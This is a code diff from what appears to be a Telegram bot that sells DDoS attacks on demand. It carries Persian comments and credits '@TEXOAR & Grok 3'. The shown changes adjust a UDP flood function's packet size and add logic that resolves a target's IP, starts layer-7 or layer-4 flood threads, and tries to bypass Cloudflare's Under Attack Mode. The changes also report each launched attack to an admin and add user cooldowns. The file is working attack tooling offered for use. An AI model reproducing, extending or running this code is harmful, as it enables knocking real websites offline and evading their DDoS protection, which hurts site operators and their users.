@@ -163,7 +163,7 @@ def layer7_attack(target, duration, rps, stop_event):
 # متد UDP قدرتمند با IP
 def layer4_attack(target_ip, port, duration, rps, stop_event):
     stop_time = time.time() + duration
-    packet = random._urandom(4084)  # پاکت بزرگ‌تر
+    packet = random._urandom(2048)  # پاکت بزرگ‌تر
 
     def send_packet():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -477,4 +477,106 @@ def start_attack(chat_id, user_id):
             args = (target, duration, rps, stop_event)
             is_async = False
     else:
-        target_ip = socket.gethostbyname(ta
+        target_ip = socket.gethostbyname(target.split("://")[1].split("/")[0] if "://" in target else target)
+        port = user_data[chat_id].get("port", 80)
+        attack_func = layer4_attack
+        args = (target_ip, port, duration, rps, stop_event)
+        is_async = False
+
+    attack_info = f"⚠️ New Attack Launched\nUser ID: {user_id}\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nDuration: {duration}s\nRPS: {rps}"
+    if layer == "L4":
+        attack_info += f"\nPort: {port}"
+    bot.send_message(ADMIN_ID, attack_info)
+
+    initial_status = check_status(target) if layer == "L7" else "🟡 UDP - No ping"
+    protection = detect_protection(requests.get(target, headers={"User-Agent": random.choice(user_agents)}).headers) if layer == "L7" else "Unknown"
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("Stop Attack", callback_data="stop_attack"))
+    result_msg = bot.send_message(chat_id, f"🚀 Attack Started\nUser ID: {user_id}\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nDuration: {duration}s\nRPS: {rps}\nProtection: {protection}\nStatus: {initial_status}", reply_markup=markup)
+
+    if is_async:
+        if method == "BYPASS_UAM":
+            bypass_task = threading.Thread(target=lambda: asyncio.run(attack_func(*args)))
+            bypass_task.start()
+            bypass_task.join()
+            success, bypass_status = asyncio.run(bypass_cloudflare_uam(target, stop_event))
+            bot.edit_message_text(chat_id=chat_id, message_id=result_msg.message_id,
+                                  text=f"🚀 Bypass UAM Result\nTarget: {target}\nIP: {target_ip}\nStatus: {bypass_status}\nThanks to: @TEXOAR & Grok 3")
+        else:
+            attack_task = threading.Thread(target=lambda: asyncio.run(attack_func(*args)))
+            attack_task.start()
+            status_thread = threading.Thread(target=update_status, args=(chat_id, result_msg.message_id, target, target_ip, layer, method, duration, rps, protection, stop_event))
+            status_thread.start()
+
+            attack_task.join()
+            status_thread.join()
+    else:
+        attack_task = threading.Thread(target=attack_func, args=args)
+        attack_task.start()
+        status_thread = threading.Thread(target=update_status, args=(chat_id, result_msg.message_id, target, target_ip, layer, method, duration, rps, protection, stop_event))
+        status_thread.start()
+
+        attack_task.join()
+        status_thread.join()
+
+    is_attacking = False
+
+    if user_id != ADMIN_ID:
+        cooldowns[user_id] = time.time() + 60
+        save_cooldowns()
+        bot.send_message(chat_id, "⏳ Cool Down 60s اعمال شد!")
+
+    if not stop_event.is_set() and method != "BYPASS_UAM":
+        final_status = check_status(target) if layer == "L7" else "🟡 UDP - No ping"
+        final_message = f"✅ Attack Success\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nDuration: 0s\nRPS: {rps}\nProtection: {protection}\nStatus: {final_status}\nThanks to: @TEXOAR & Grok 3\nاتک تموم شد، حالا بریم چای بخوریم! 😂"
+        bot.edit_message_text(chat_id=chat_id, message_id=result_msg.message_id, text=final_message)
+    elif stop_event.is_set() and method != "BYPASS_UAM":
+        bot.edit_message_text(chat_id=chat_id, message_id=result_msg.message_id,
+                              text=f"⛔ Attack Stopped\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nRPS: {rps}\nThanks to: @TEXOAR & Grok 3")
+
+    if chat_id in attack_threads:
+        del attack_threads[chat_id]
+    if method != "BYPASS_UAM":
+        del user_data[chat_id]
+
+def stop_attack(chat_id, message_id):
+    if chat_id in attack_threads:
+        attack_threads[chat_id].set()
+        target = user_data[chat_id]["host"]
+        target_ip = socket.gethostbyname(urllib.parse.urlparse(target).hostname if "://" in target else target)
+        bot.edit_message_text(chat_id=chat_id, message_id=message_id,
+                              text=f"⛔ Attack Stopped\nTarget: {target}\nIP: {target_ip}\nLayer: {user_data[chat_id]['layer']}\nMethod: {user_data[chat_id]['method']}\nRPS: {user_data[chat_id]['rps']}\nThanks to: @TEXOAR & Grok 3")
+
+# چک سکوت کاربران
+@bot.message_handler(content_types=['text', 'photo', 'video', 'audio', 'document', 'sticker', 'voice', 'video_note', 'contact', 'location', 'venue', 'poll', 'dice', 'new_chat_members', 'left_chat_member', 'new_chat_title', 'new_chat_photo', 'delete_chat_photo', 'group_chat_created', 'supergroup_chat_created', 'channel_chat_created', 'migrate_to_chat_id', 'migrate_from_chat_id', 'pinned_message'])
+def check_mute(message):
+    user_id = str(message.from_user.id)
+    if user_id in muted_users and time.time() < muted_users[user_id]:
+        return
+    elif user_id in muted_users and time.time() >= muted_users[user_id]:
+        del muted_users[user_id]
+        save_muted_users()
+        if message.chat.type in ['group', 'supergroup']:
+            bot.restrict_chat_member(message.chat.id, int(user_id), can_send_messages=True)
+
+# شروع ربات با دیباگ خطاها
+def handle_exceptions(exc_type, exc_value, exc_traceback):
+    print(f"{Fore.RED}Error occurred: {exc_type.__name__} - {exc_value}{Fore.RESET}")
+
+import sys
+sys.excepthook = handle_exceptions
+
+# ریست آپدیت‌ها برای جلوگیری از تعارض
+def clear_updates():
+    try:
+        bot.get_updates(offset=-1)
+        print(f"{Fore.GREEN}Old updates cleared successfully!{Fore.RESET}")
+    except Exception as e:
+        print(f"{Fore.YELLOW}Warning: Could not clear updates - {str(e)}{Fore.RESET}")
+
+print(f"{Fore.MAGENTA}DDoS API Bot Started!{Fore.RESET}")
+clear_updates()
+try:
+    bot.polling(none_stop=True, allowed_updates=telebot.util.update_types)
+except Exception as e:
+    print(f"{Fore.RED}Polling Error: {str(e)}{Fore.RESET}")
